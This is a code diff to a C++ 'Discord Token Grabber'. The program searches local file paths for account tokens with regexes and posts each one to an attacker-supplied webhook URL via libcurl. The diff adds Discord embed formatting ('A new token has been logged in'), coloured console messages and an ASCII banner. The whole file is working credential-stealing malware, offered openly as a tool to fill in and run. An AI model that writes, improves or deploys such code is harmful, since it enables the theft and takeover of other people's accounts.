@@ -5,6 +5,7 @@
 #include <filesystem>
 #include <regex>
 #include <thread>
+#include "Colors.h"
 #include <curl/curl.h>
 
 const char* webhook_url = "put your webhook url here";
@@ -19,7 +20,7 @@ bool exists(const std::string& path) {
 	return (stat(path.c_str(), &buffer) == 0);
 }
 
-void send_webhook_data(const char* data) {
+void send_webhook_data(const std::string& data, const std::string& title, int color) {
 	CURL* curl;
 	CURLcode res;
 
@@ -27,16 +28,36 @@ void send_webhook_data(const char* data) {
 	curl = curl_easy_init();
 
 	if (curl) {
+		struct curl_slist* headers = NULL;
+		headers = curl_slist_append(headers, "Content-Type: application/json");
+
+		std::string payload = R"(
+		{
+			"content": "",
+			"embeds": [
+				{
+					"title": ")" + title + R"(",
+					"description": ")" + data + R"(",
+					"color": )" + std::to_string(color) + R"(
+				}
+			]
+		})";
+
 		curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
+		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+		curl_easy_setopt(curl, CURLOPT_POST, 1L);
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
 
 		res = curl_easy_perform(curl);
 
 		if (res != CURLE_OK) {
+			SetConsoleColor(LIGHT_RED_COLOR);
 			std::cerr << "Error trying to perform: " << curl_easy_strerror(res) << std::endl;
+			SetConsoleColor(RESET_COLOR);
 		}
 
 		curl_easy_cleanup(curl);
+		curl_slist_free_all(headers);
 	}
 
 	curl_global_cleanup();
@@ -89,7 +110,9 @@ std::vector<std::string> find_paths() {
 void search_token(const std::string& target, const std::string& path) {
 	std::ifstream ifs(path, std::ios_base::binary);
 	if (!ifs.is_open()) {
+		SetConsoleColor(LIGHT_RED_COLOR);
 		std::cerr << "Error trying to open path: " << path << std::endl;
+		SetConsoleColor(RESET_COLOR);
 		return;
 	}
 
@@ -113,10 +136,11 @@ void search_token(const std::string& target, const std::string& path) {
 	search_and_append(content, reg2);
 
 	for (const auto& token : data) {
-		std::string combine = "content=";
-		combine += "```" + target + ": " + token + "```";
+		SetConsoleColor(LIGHT_YELLOW_COLOR);
+		std::cout << "[!] Sending token found on path: " << target << std::endl;
+		SetConsoleColor(RESET_COLOR);
 
-		send_webhook_data(combine.c_str());
+		send_webhook_data(token, "A new token has been logged in", 8105471);
 	}
 }
 
@@ -137,11 +161,24 @@ void find_token(const std::string& path) {
 		}
 	}
 	catch (const std::exception& err) {
+		SetConsoleColor(LIGHT_RED_COLOR);
 		std::cout << "Error trying to get tokens on path: " << path << std::endl;
+		SetConsoleColor(RESET_COLOR);
 	}
 }
 
 int main(int argc, char* argv[]) {
+	SetConsoleColor(LIGHT_CYAN_COLOR);
+	std::cout << "______ _                       _   _____     _                _____           _     _               \n";
+	std::cout << "|  _  (_)                     | | |_   _|   | |              |  __ \\         | |   | |              \n";
+	std::cout << "| | | |_ ___  ___ ___  _ __ __| |   | | ___ | | _____ _ __   | |  \\/_ __ __ _| |__ | |__   ___ _ __ \n";
+	std::cout << "| | | | / __|/ __/ _ \\| '__/ _` |   | |/ _ \\| |/ / _ \\ '_ \\  | | __| '__/ _` | '_ \\| '_ \\ / _ \\ '__|\n";
+	std::cout << "| |/ /| \\__ \\ (_| (_) | | | (_| |   | | (_) |   <  __/ | | | | |_\\ \\ | | (_| | |_) | |_) |  __/ |   \n";
+	std::cout << "|___/ |_|___/\\___\\___/|_|  \\__,_|   \\_/\\___/|_|\\_\\___|_| |_|  \\____/_|  \\__,_|_.__/|_.__/ \\___|_|   \n";
+	std::cout << "                                                                                                    \n";
+	std::cout << std::endl;
+	SetConsoleColor(RESET_COLOR);
+
 	std::vector<std::string> paths = find_paths();
 	std::vector<std::thread> threads;
 
@@ -157,7 +194,10 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-	std::cout << "Tokens have been sent to the webhook." << std::endl;
+	SetConsoleColor(LIGHT_CYAN_COLOR);
+	std::cout << "[*] Tokens have been sent to the webhook." << std::endl;
+	SetConsoleColor(RESET_COLOR);
+
 	std::cin.get();
 
 	return EXIT_SUCCESS;
